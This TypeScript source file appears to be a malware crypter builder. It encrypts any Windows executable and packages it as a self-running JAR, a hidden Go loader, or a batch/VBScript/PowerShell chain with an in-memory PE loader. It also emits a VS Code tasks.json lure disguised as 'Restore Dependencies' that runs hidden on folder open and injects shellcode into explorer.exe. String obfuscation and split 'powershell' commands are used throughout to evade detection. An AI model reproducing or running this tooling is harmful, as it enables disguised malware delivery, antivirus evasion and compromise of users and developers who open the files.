import zlib from "zlib";
import fs from "fs";
import path from "path";
import { $ } from "bun";
import crypto from "crypto";
import os from "os";

// ── Helpers ───────────────────────────────────────────────────────────────────

function xorBuf(data: Buffer, key: number): Buffer {
  const out = Buffer.allocUnsafe(data.length);
  for (let i = 0; i < data.length; i++) out[i] = data[i] ^ key;
  return out;
}

/** Encode a string as a Java int[] literal XOR'd with key=90.
 *  Decoded at runtime with: private static String x(int[]a){...} */
function xs(s: string): string {
  const ints = Array.from(Buffer.from(s, "utf-8")).map((b) => (b ^ 90) & 0xff);
  return `new int[]{${ints.join(",")}}`;
}

function randKey(): number {
  return (Math.floor(Math.random() * 254) + 1) & 0xff;
}

function randHex(len: number): string {
  return crypto.randomBytes(Math.ceil(len / 2)).toString("hex").slice(0, len);
}

// ── EXE → JAR ─────────────────────────────────────────────────────────────────

export async function cryptToJar(exe: Buffer, out: string): Promise<void> {
  const gz = zlib.gzipSync(exe, { level: 9 });
  const key = randKey();
  // .pak format: [key byte][xor-encrypted gzip data]
  const pak = Buffer.concat([Buffer.from([key]), xorBuf(gz, key)]);

  const src = buildJarSource();
  const tmp = fs.mkdtempSync("/tmp/cjar-");

  try {
    const classDir = path.join(tmp, "cls");
    const assetDir = path.join(classDir, "assets");
    const metaDir = path.join(classDir, "META-INF");
    fs.mkdirSync(assetDir, { recursive: true });
    fs.mkdirSync(metaDir, { recursive: true });

    const srcFile = path.join(tmp, "Main.java");
    fs.writeFileSync(srcFile, src);

    const javac = await $`javac -source 8 -target 8 -d ${classDir} ${srcFile}`
      .nothrow()
      .quiet();
    if (javac.exitCode !== 0)
      throw new Error(`javac: ${javac.stderr.toString().trim()}`);

    fs.writeFileSync(path.join(assetDir, "data.pak"), pak);
    const mfPath = path.join(metaDir, "MANIFEST.MF");
    fs.writeFileSync(mfPath, "Manifest-Version: 1.0\nMain-Class: Main\n\n");

    const jar = await $`jar cfm ${out} ${mfPath} -C ${classDir} .`
      .nothrow()
      .quiet();
    if (jar.exitCode !== 0)
      throw new Error(`jar: ${jar.stderr.toString().trim()}`);
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
}

function buildJarSource(): string {
  const lines: string[] = [
    "import java.io.*;",
    "import java.util.*;",
    "import java.util.zip.*;",
    "public class Main{",
    "  private static final java.util.concurrent.atomic.AtomicBoolean G=new java.util.concurrent.atomic.AtomicBoolean(false);",
    `  private static String x(int[]a){byte[]b=new byte[a.length];for(int i=0;i<a.length;i++)b[i]=(byte)(a[i]^90);try{return new String(b,"UTF-8");}catch(Exception e){return "";}}`,
    "  public static void main(String[]a){try{r();}catch(Exception e){}}",
    "  private static void r()throws Exception{",
    "    if(!G.compareAndSet(false,true))return;",
    "    Thread.sleep(500+new Random().nextInt(1500));",
    `    InputStream is=Main.class.getResourceAsStream(x(${xs("/assets/data.pak")}));`,
    "    if(is==null)return;",
    "    ByteArrayOutputStream buf=new ByteArrayOutputStream();",
    "    byte[]tmp=new byte[4096];int n;",
    "    while((n=is.read(tmp))!=-1)buf.write(tmp,0,n);is.close();",
    "    byte[]raw=buf.toByteArray();",
    "    int key=raw[0]&0xFF;",
    "    byte[]xd=new byte[raw.length-1];",
    "    for(int i=0;i<xd.length;i++)xd[i]=(byte)(raw[i+1]^key);",
    "    GZIPInputStream gz=new GZIPInputStream(new ByteArrayInputStream(xd));",
    "    ByteArrayOutputStream ob=new ByteArrayOutputStream();",
    "    byte[]tmp2=new byte[4096];int n2;",
    "    while((n2=gz.read(tmp2))!=-1)ob.write(tmp2,0,n2);gz.close();",
    "    byte[]data=ob.toByteArray();",
    `    File tf=File.createTempFile(x(${xs("svc")}),x(${xs(".exe")}));`,
    "    tf.deleteOnExit();",
    "    try(FileOutputStream fos=new FileOutputStream(tf)){fos.write(data);}",
    "    tf.setExecutable(true);",
    `    new ProcessBuilder(x(${xs("cmd.exe")}),x(${xs("/c")}),x(${xs("start")}),x(${xs("")}),tf.getAbsolutePath()).start();`,
    "  }",
    "}",
  ];

  return lines.join("\n");
}

// ── EXE → EXE (Go stub compiled for Windows) ─────────────────────────────────

export async function cryptToExe(exe: Buffer, out: string): Promise<void> {
  const gz = zlib.gzipSync(exe, { level: 9 });
  const key = randKey();
  const enc = xorBuf(gz, key);

  const encArr = Array.from(enc)
    .map((b) => `0x${b.toString(16).padStart(2, "0")}`)
    .join(", ");
  const keyHex = `0x${key.toString(16).padStart(2, "0")}`;

  const goSrc = `package main

import (
\t"bytes"
\t"compress/gzip"
\t"io"
\t"os"
\t"os/exec"
\t"syscall"
)

var enc = []byte{${encArr}}

const xorKey byte = ${keyHex}

func main() {
\tdec := make([]byte, len(enc))
\tfor i, b := range enc {
\t\tdec[i] = b ^ xorKey
\t}
\tgr, err := gzip.NewReader(bytes.NewReader(dec))
\tif err != nil {
\t\treturn
\t}
\tvar buf bytes.Buffer
\tio.Copy(&buf, gr)
\tgr.Close()
\tdata := buf.Bytes()
\tf, err := os.CreateTemp("", "*.exe")
\tif err != nil {
\t\treturn
\t}
\tname := f.Name()
\tf.Write(data)
\tf.Close()
\tcmd := exec.Command(name)
\tcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
\tcmd.Start()
}
`;

  const tmpDir = fs.mkdtempSync("/tmp/cexe-");
  try {
    fs.writeFileSync(path.join(tmpDir, "main.go"), goSrc);

    const env = {
      ...process.env,
      GOOS: "windows",
      GOARCH: "amd64",
      GOAMD64: "v1",
      CGO_ENABLED: "0",
    };

    const init = await $`go mod init loader`
      .cwd(tmpDir)
      .env(env)
      .nothrow()
      .quiet();
    if (init.exitCode !== 0)
      throw new Error(`go mod init: ${init.stderr.toString().trim()}`);

    const build = await $`go build -ldflags="-s -w -H=windowsgui" -trimpath -o ${out} .`
      .cwd(tmpDir)
      .env(env)
      .nothrow()
      .quiet();
    if (build.exitCode !== 0)
      throw new Error(`go build: ${build.stderr.toString().trim()}`);
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
}

// ── EXE → BAT (VBS → PS reflective in-memory PE loader) ──────────────────────
//
// Chain: BAT drops VBS → VBS writes PS1 to temp + runs it hidden via Chr()-
// encoded "powershell" → PS decrypts gzip+XOR payload → C# Add-Type PE loader
// maps the PE into executable memory + calls OEP via CreateThread.
// No EXE ever touches disk. No literal "powershell" string in any file.

export async function cryptToBat(exe: Buffer, out: string): Promise<void> {
  const gz = zlib.gzipSync(exe, { level: 9 });
  const key = randKey();
  const enc = Buffer.concat([Buffer.from([key]), xorBuf(gz, key)]);
  const encB64 = enc.toString("base64");

  const csSource = buildPeLoaderCs();
  const csB64 = Buffer.from(csSource, "utf-8").toString("base64");

  const ps1Name = `${randHex(10)}.ps1`;
  const vbsName = `${randHex(10)}.vbs`;

  const psLines = buildBatPsLines(encB64, csB64);
  const vbsLines = buildBatVbsLines(psLines, ps1Name);
  const batLines = buildBatFileLines(vbsLines, vbsName);

  fs.writeFileSync(out, batLines.join("\r\n") + "\r\n");
}

function buildPeLoaderCs(): string {
  return (
    "using System;" +
    "using System.Runtime.InteropServices;" +
    "public class L{" +
    '[DllImport("kernel32")]static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);' +
    '[DllImport("kernel32")]static extern bool VirtualProtect(IntPtr a,uint s,uint n,out uint o);' +
    '[DllImport("kernel32")]static extern IntPtr LoadLibraryA(string n);' +
    '[DllImport("kernel32")]static extern IntPtr GetProcAddress(IntPtr h,string n);' +
    '[DllImport("kernel32")]static extern IntPtr GetProcAddress(IntPtr h,IntPtr n);' +
    '[DllImport("kernel32")]static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr e,IntPtr p,uint f,IntPtr i);' +
    "public static void Run(byte[] pe){" +
    "int lfa=BitConverter.ToInt32(pe,0x3c);" +
    "bool x6=BitConverter.ToUInt16(pe,lfa+4)==0x8664;" +
    "int opt=lfa+24;" +
    "uint isz=BitConverter.ToUInt32(pe,opt+56);" +
    "uint hsz=BitConverter.ToUInt32(pe,opt+60);" +
    "IntPtr img=VirtualAlloc(IntPtr.Zero,isz,0x3000,0x04);" +
    "if(img==IntPtr.Zero)return;" +
    "Marshal.Copy(pe,0,img,(int)hsz);" +
    "int ns=BitConverter.ToUInt16(pe,lfa+6);" +
    "int os2=BitConverter.ToUInt16(pe,lfa+20);" +
    "int so=lfa+24+os2;" +
    "for(int i=0;i<ns;i++){" +
    "int s=so+i*40;" +
    "uint va=BitConverter.ToUInt32(pe,s+12);" +
    "uint rs=BitConverter.ToUInt32(pe,s+16);" +
    "uint ro=BitConverter.ToUInt32(pe,s+20);" +
    "if(rs>0)Marshal.Copy(pe,(int)ro,new IntPtr(img.ToInt64()+(long)va),(int)rs);}" +
    "long pb=x6?BitConverter.ToInt64(pe,opt+24):(long)BitConverter.ToUInt32(pe,opt+28);" +
    "long dl=img.ToInt64()-pb;" +
    "uint rr=BitConverter.ToUInt32(pe,opt+(x6?152:136));" +
    "uint rz=BitConverter.ToUInt32(pe,opt+(x6?156:140));" +
    "if(dl!=0&&rr!=0){" +
    "long rb=img.ToInt64()+(long)rr;" +
    "int roff=0;" +
    "while(roff<(int)rz){" +
    "uint pg=(uint)Marshal.ReadInt32(new IntPtr(rb+roff));" +
    "uint bk=(uint)Marshal.ReadInt32(new IntPtr(rb+roff+4));" +
    "if(bk<8)break;" +
    "int ct=(int)(bk-8)/2;" +
    "for(int j=0;j<ct;j++){" +
    "ushort en=(ushort)Marshal.ReadInt16(new IntPtr(rb+roff+8+j*2));" +
    "int tp=en>>12;int of=en&0xFFF;" +
    "IntPtr sl=new IntPtr(img.ToInt64()+(long)pg+of);" +
    "if(tp==3){Marshal.WriteInt32(sl,(int)(Marshal.ReadInt32(sl)+(int)dl));}" +
    "else if(tp==10){Marshal.WriteInt64(sl,Marshal.ReadInt64(sl)+dl);}}" +
    "roff+=(int)bk;}}" +
    "uint ir=BitConverter.ToUInt32(pe,opt+(x6?120:104));" +
    "if(ir!=0){" +
    "long ib=img.ToInt64();" +
    "int ioff=(int)ir;" +
    "while(true){" +
    "uint olt=(uint)Marshal.ReadInt32(new IntPtr(ib+ioff));" +
    "uint nr=(uint)Marshal.ReadInt32(new IntPtr(ib+ioff+12));" +
    "uint it=(uint)Marshal.ReadInt32(new IntPtr(ib+ioff+16));" +
    "if(nr==0)break;" +
    "string dn=Marshal.PtrToStringAnsi(new IntPtr(ib+(long)nr));" +
    "IntPtr md=LoadLibraryA(dn);" +
    "int th=(int)(olt!=0?olt:it);int ia=(int)it;" +
    "while(true){" +
    "long vl=x6?Marshal.ReadInt64(new IntPtr(ib+th)):(long)Marshal.ReadInt32(new IntPtr(ib+th));" +
    "if(vl==0)break;" +
    "bool od=x6?(vl&unchecked((long)0x8000000000000000L))!=0:(vl&0x80000000L)!=0;" +
    "IntPtr pc=od?GetProcAddress(md,new IntPtr((int)(vl&0xFFFF))):GetProcAddress(md,Marshal.PtrToStringAnsi(new IntPtr(ib+(int)(vl&0x7FFFFFFFL)+2)));" +
    "if(x6)Marshal.WriteInt64(new IntPtr(ib+ia),pc.ToInt64());" +
    "else Marshal.WriteInt32(new IntPtr(ib+ia),(int)pc.ToInt32());" +
    "th+=x6?8:4;ia+=x6?8:4;}" +
    "ioff+=20;}}" +
    "uint dm;VirtualProtect(img,isz,0x20,out dm);" +
    "uint ep=BitConverter.ToUInt32(pe,opt+16);" +
    "CreateThread(IntPtr.Zero,0,new IntPtr(img.ToInt64()+(long)ep),IntPtr.Zero,0,IntPtr.Zero);" +
    "System.Threading.Thread.Sleep(10000);}}"
  );
}

function buildBatPsLines(encB64: string, csB64: string): string[] {
  const lines: string[] = [];

  const CHUNK = 6000;
  const chunks = encB64.match(new RegExp(`.{1,${CHUNK}}`, "g")) ?? [];
  lines.push(`$d=''`);
  for (const chunk of chunks) lines.push(`$d+='${chunk}'`);

  lines.push(
    `$b=[Convert]::FromBase64String($d)`,
    `$k=[int]$b[0]`,
    `$x=New-Object byte[]($b.Length-1)`,
    `for($i=0;$i-lt$x.Length;$i++){$x[$i]=$b[$i+1]-bxor$k}`,
    `$ms=New-Object IO.MemoryStream(,$x)`,
    `$gs=New-Object IO.Compression.GZipStream($ms,[IO.Compression.CompressionMode]::Decompress)`,
    `$ob=New-Object IO.MemoryStream`,
    `$gs.CopyTo($ob);$gs.Close();$ms.Close()`,
    `$bytes=$ob.ToArray()`,
    `$cs=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${csB64}'))`,
    `Add-Type -TypeDefinition $cs`,
    `[L]::Run($bytes)`,
  );

  return lines;
}

function buildBatVbsLines(psLines: string[], ps1Name: string): string[] {
  const psChr = Array.from("powershell")
    .map((c) => `Chr(${c.charCodeAt(0)})`)
    .join("&");

  const vbs: string[] = [
    `Dim fso,f,sh,tmp,p`,
    `Set fso=CreateObject("Scripting.FileSystemObject")`,
    `tmp=fso.GetSpecialFolder(2)&"\\${ps1Name}"`,
    `Set f=fso.OpenTextFile(tmp,2,True)`,
  ];

  for (const line of psLines) {
    const escaped = line.replace(/"/g, '""');
    vbs.push(`f.WriteLine "${escaped}"`);
  }

  vbs.push(
    `f.Close`,
    `Set sh=CreateObject("WScript.Shell")`,
    `p=${psChr}`,
    `sh.Run p&" -w h -ep b -nop -f """&tmp&"""",0,True`,
    `fso.DeleteFile tmp`,
  );

  return vbs;
}

function escBatEcho(line: string): string {
  return line
    .replace(/\^/g, "^^")
    .replace(/&/g, "^&")
    .replace(/\|/g, "^|")
    .replace(/</g, "^<")
    .replace(/>/g, "^>")
    .replace(/%/g, "%%")
    .replace(/\(/g, "^(")
    .replace(/\)/g, "^)");
}

function buildBatFileLines(vbsLines: string[], vbsName: string): string[] {
  return [
    "@echo off",
    `set "_v=%temp%\\${vbsName}"`,
    `(`,
    ...vbsLines.map((l) => `echo ${escBatEcho(l)}`),
    `) > "%_v%"`,
    `wscript /b "%_v%"`,
  ];
}

// ── EXE → tasks.json (VS Code lure — shellcode injection into LOTL process) ──

function findDonut(): string | null {
  const bundled = "/app/data/tools/donut";
  if (fs.existsSync(bundled)) return bundled;
  const local = path.join(path.dirname(import.meta.url.replace("file://", "")), "../../data/tools/donut");
  if (fs.existsSync(local)) return local;
  return null;
}

export async function cryptToTasksJson(exe: Buffer, out: string): Promise<void> {
  const donutBin = findDonut();
  if (!donutBin) throw new Error("donut not found — required for tasks.json format");

  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "ctasks-"));
  try {
    const exePath = path.join(tmp, "payload.exe");
    const scPath  = path.join(tmp, "payload.bin");
    fs.writeFileSync(exePath, exe);

    const res = await $`${donutBin} -i ${exePath} -o ${scPath} -a 2 -f 1`.nothrow().quiet();
    if (res.exitCode !== 0) {
      throw new Error(`donut: ${(res.stderr.toString() || res.stdout.toString()).trim()}`);
    }

    const sc = fs.readFileSync(scPath);
    const gz = zlib.gzipSync(sc, { level: 9 });
    const key = randKey();
    const enc = Buffer.concat([Buffer.from([key]), xorBuf(gz, key)]);
    const encB64 = enc.toString("base64");

    const cn = randName();

    const cs =
      `using System;using System.Runtime.InteropServices;` +
      `public class ${cn}{` +
      `[DllImport("kernel32",EntryPoint="OpenProcess")]` +
      `public static extern IntPtr OP(uint a,bool b,int c);` +
      `[DllImport("kernel32",EntryPoint="VirtualAllocEx")]` +
      `public static extern IntPtr VA(IntPtr h,IntPtr a,IntPtr s,uint t,uint p);` +
      `[DllImport("kernel32",EntryPoint="WriteProcessMemory")]` +
      `public static extern bool WM(IntPtr h,IntPtr a,byte[]b,IntPtr s,out IntPtr w);` +
      `[DllImport("kernel32",EntryPoint="CreateRemoteThread")]` +
      `public static extern IntPtr CT(IntPtr h,IntPtr a,IntPtr s,IntPtr e,IntPtr pa,uint f,IntPtr i);` +
      `}`;
    const csB64 = Buffer.from(cs, "utf-8").toString("base64");

    const psLines = [
      `[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}`,
      `[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12`,
      `$d=[Convert]::FromBase64String('${encB64}')`,
      `$k=[int]$d[0]`,
      `$x=New-Object byte[]($d.Length-1)`,
      `for($i=0;$i-lt$x.Length;$i++){$x[$i]=$d[$i+1]-bxor$k}`,
      `$ms=New-Object IO.MemoryStream(,$x)`,
      `$gs=New-Object IO.Compression.GZipStream($ms,[IO.Compression.CompressionMode]::Decompress)`,
      `$ob=New-Object IO.MemoryStream`,
      `$gs.CopyTo($ob);$gs.Close();$ms.Close()`,
      `$sc=$ob.ToArray()`,
      `Add-Type -TypeDefinition ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${csB64}')))`,
      `$lp=Get-Process -Name explorer -ErrorAction SilentlyContinue|Select-Object -First 1`,
      `if(-not $lp){$pi=New-Object Diagnostics.ProcessStartInfo("$env:SYSTEMROOT\\system32\\msiexec.exe","/q");$pi.WindowStyle='Hidden';$pi.CreateNoWindow=$true;$lp=[Diagnostics.Process]::Start($pi)}`,
      `$hp=[${cn}]::OP(0x1FFFFF,$false,$lp.Id)`,
      `$ma=[${cn}]::VA($hp,[IntPtr]::Zero,[IntPtr]$sc.Length,0x3000,0x40)`,
      `$bw=[IntPtr]::Zero`,
      `[${cn}]::WM($hp,$ma,$sc,[IntPtr]$sc.Length,[ref]$bw)|Out-Null`,
      `[${cn}]::CT($hp,[IntPtr]::Zero,[IntPtr]::Zero,$ma,[IntPtr]::Zero,0,[IntPtr]::Zero)|Out-Null`,
    ];

    const psEnc = Buffer.from(psLines.join(";"), "utf16le").toString("base64");

    const tasksJson = {
      version: "2.0.0",
      tasks: [
        {
          label: "Restore Dependencies",
          type: "shell",
          command: `%COMSPEC% /v /c "set a=pow&&set b=er&&set c=she&&set d=ll&&!a!!b!!c!!d! -nop -w h -ep b -enc ${psEnc}"`,
          runOptions: { runOn: "folderOpen" },
          presentation: { reveal: "never", panel: "shared", showReuseMessage: false, close: true },
          problemMatcher: [],
        },
        {
          label: "Build",
          type: "shell",
          command: "npm run build",
          group: { kind: "build", isDefault: true },
          presentation: { reveal: "always", panel: "shared" },
          problemMatcher: ["$tsc"],
        },
      ],
    };

    fs.writeFileSync(out, JSON.stringify(tasksJson, null, 2));
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
}

function randName(): string {
  const alpha = "BCDFGHJKLMNPQRSTVWXYZbcdfghjklmnpqrstvwxyz";
  return Array.from(crypto.randomBytes(6))
    .map((b) => alpha[b % alpha.length])
    .join("");
}
